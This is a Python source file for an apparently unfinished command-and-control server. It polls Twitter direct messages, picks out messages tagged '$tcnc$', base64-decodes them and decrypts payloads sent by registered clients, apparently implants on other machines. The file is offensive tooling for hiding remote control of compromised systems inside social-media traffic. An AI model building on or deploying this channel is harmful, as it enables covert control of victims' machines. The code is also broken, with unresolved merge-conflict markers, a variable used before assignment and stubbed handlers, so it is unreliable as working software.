#!/usr/bin/python3

import tweepy, os, base64, _thread, sqlite3, time
from ast import literal_eval
from subprocess import Popen, PIPE
from termcolor import colored as c
from tweepy import OAuthHandler
# Local libs below
import config
from libs.console import Autocomplete, start_shell
import libs.formatting as formatting
import libs.polling as poll

# Twitter Auth and API configuration
auth = OAuthHandler(config.keys['consumer_key'],config.keys['consumer_secret'])
auth.set_access_token(config.keys['access_token'],config.keys['access_secret'])
api = tweepy.API(auth, wait_on_rate_limit=True)

# Pretty colours
def error(msg): return "%s %s" % (c("[!]","red"),msg)
def info(msg): return "%s %s" % (c("[*]","cyan"),msg)
def fail(msg): return "[%s] : %s" % (c("FAILED","red"),msg)
def ok(msg): return "[  %s  ] : %s" % (c("OK","green"),msg)
def done(msg): return "[ %s ] : %s" % (c("DONE","green"),msg)

# Polling
def start_polling():
	_thread.start_new_thread(poll.check_dms, (api, config.keys['agent_username']))
	while True:
		poll.sort_queue(handle_msg)
		time.sleep(1)

# Commands and Command Handler
man = {
	'help':'Prints the help menue',
	'exit':'Exits the program',
	'man':'Print help for a single command. Usage: "man help"',
}

def help_menu(): # ooh, pretty
	built = ''
	for i in man:
		built += "\n%s : %s" % (i, c(man[i],"green"))
	return built

class CmdHandler(object):
	commands = []
	for i in man:
		commands.append(i)
	def handle(self, cmd):
		if cmd == "" or cmd == " ":
			return None
		try:
			base = cmd.split(" ")[0]
		except:
			base = cmd
		if base == "help":
			print(help_menu())
			return None
		elif base == "exit":
			sure = input("Are you sure? %s/%s: " % (c("y","green"),c("N","red"))).lower()
			if not sure == "y":
				return None
			exit_sequence() #TODO
			return "exit"
		elif base == "man":
			try:
				helpobj = cmd.split(" ")[1]
			except:
				print(error("man: Requires one argument"))
				helpobj = "man"
			if not helpobj in man:
				print(error("man: Command not found"))
				return None
			print("%s : %s" % (helpobj,c(man[helpobj],"green")))
			return None
		else:
			print(error("Command not found / Invalid syntax"))
			return None

# Message handling
def handle_message(msg):
	if not '$' in msg:
		return None
	data = msg.split("$tcnc$")[1]
	json = base64.b64decode(json).decode()
	msg = literal_eval(json)
	# Ok, now that the msg has been decoded,
	if not msg['cliid'] in all_cliids():
		return None
	key = get_cli_key(msg['cliid'])
	pcall = msg['type']
	pl = literal_eval(formatting.decode(msg['data'],key)) # pl = payload (the encrypted data sent with the message)
<<<<<<< HEAD
	if pcall == "hello": pass
		#TODO: continue here
=======
	if pcall == "hello":
		name = pl['name']
		#TODO: CONT HERE
>>>>>>> 555cc82c3193ab2d44df047b1896d9384f6feb30










# Main program & stuff

#TODO
def start_sequence():
	pass
def exit_sequence():
	pass

#TODO
def main():
	start_sequence()
	#uhh
	exit_sequence()

if __name__ == "__main__":
	main()
